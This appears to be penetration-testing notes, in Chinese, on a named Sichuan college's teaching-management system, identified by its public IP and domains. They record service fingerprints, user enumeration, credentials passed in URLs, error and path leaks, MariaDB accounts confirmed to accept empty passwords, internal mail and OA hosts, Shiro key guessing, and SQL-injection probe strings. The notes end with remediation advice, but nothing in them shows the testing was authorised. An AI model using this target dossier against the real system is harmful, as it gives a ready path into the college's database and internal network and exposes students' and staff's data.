# 四川邮电职业技术学院 (SPTC) EduManager/beego 测试模式

## 目标信息
- IP: 1.95.78.227 (华为云ECS)
- 域名: sptc.edu.cn / eduwebmanager.com
- 系统: 教学辅助 (Vue.js SPA + Go后端 EduManager)
- 框架: beego 2.0.0
- WAF: 无

## 技术栈指纹
```
nginx 1.21.5 (HTTPS)
Go后端 EduManager (beego 2.0.0)
MariaDB 10.5.22 (MySQL) - 3306/tcp暴露
Redis - 6379/tcp暴露(需认证)
OpenSSH 8.8 - 22/tcp
```

## 关键发现

### 1. beego框架识别
404页面返回 `Powered by beego 2.0.0`，确认Go Web框架。

### 2. 用户枚举 (中危)
```
GET /api/user/login/{username}/{password}
admin → {"Title":"登录失败","Data":"密码错误","Code":1001}  (用户存在)
nobody → {"Title":"登录失败","Data":"用户不存在","Code":1001}  (用户不存在)
```
已确认用户: admin, test123

### 3. 凭证URL明文传输 (中危)
登录使用GET方法，凭证直接拼接在URL路径中：
```
GET /api/user/login/admin/MyPassword123
```

### 4. MySQL错误信息泄露 (低危)
```
POST /api/user/register → Error 1062 (23000): Duplicate entry '' for key 'PRIMARY'
```
泄露数据库类型(MySQL/MariaDB)和表结构(主键字段)。

### 5. 源码路径泄露 (低危)
```
"file":"E:/workspace/src/EduManager/utils/middleware.go","line":154}
```
泄露后端语言(Go)、开发环境(Windows E:盘)、目录结构。

### 6. MariaDB空密码 (严重)
nmap脚本确认多个用户空密码可登录:
```
nmap -p 3306 --script mysql-enum 1.95.78.227
→ root:<empty>, admin:<empty>, administrator:<empty>, user:<empty>, test:<empty>, web:<empty>, guest:<empty>, netadmin:<empty>
```

### 7. 内网资产可达
从目标DNS解析到内网IP:
```
10.255.11.39  → Coremail邮件系统 (XT5)
10.255.11.118 → Web服务器 (403)
10.255.11.121 → OA办公系统 (Apache Shiro + Spring Boot)
```

## API端点枚举
```
GET  /api/user/login/{user}/{pass}  → 登录(用户枚举)
POST /api/user/register             → 注册(MySQL错误泄露)
POST /api/user/add                  → 添加用户(需认证)
GET  /api/user/                     → 用户列表(需认证)
GET  /api/user/{id}                 → 用户详情(需认证)
POST /api/user/updateInfo/{id}      → 更新信息(需认证)
POST /api/user/updatePswd/{id}      → 更新密码(需认证)
GET  /api/user/query/class          → 按班级查询(需认证)
GET  /api/depart/                   → 部门列表(需认证)
POST /api/depart/                   → 添加部门(需认证)
PUT  /api/depart/{id}               → 更新部门(需认证)
DELETE /api/depart/{id}             → 删除部门(需认证)
```

## SQL注入分析
`admin'--` 返回"用户不存在"而非"密码错误"，但进一步测试确认后端使用参数化查询：
- `admin--` (无引号) 也返回"用户不存在"
- `admin' OR '1'='1` 返回"用户不存在"
- UNION/布尔/时间盲注均无效
- 结论: 不是SQL注入，是用户名字面量匹配

## 内网OA系统 (Apache Shiro)
```
Cookie: rememberMe=deleteMe (Shiro特征)
Cookie: OASESSIONID (会话标识)
CORS: Access-Control-Allow-Origin: * (通配符)
Shiro默认密钥测试: 20+常见密钥均未命中
```

## Coremail XT5
```
/coremail/s?func=admin:getServerList → Invalid module admin (已禁用)
/coremail/s?func=user:login → FA_INVALID_PARAMETER (需正确格式)
```

## 修复建议
1. 立即为MariaDB所有用户设置强密码
2. 限制MariaDB/Redis仅允许内网访问
3. 登录接口统一返回"用户名或密码错误"
4. 登录改为POST方法
5. 关闭MySQL错误信息直接返回
6. 关闭源码路径泄露
7. OA系统CORS设置为指定域名

## 报告
- /tmp/vuln_reports/sptc/scan-report-v2.txt
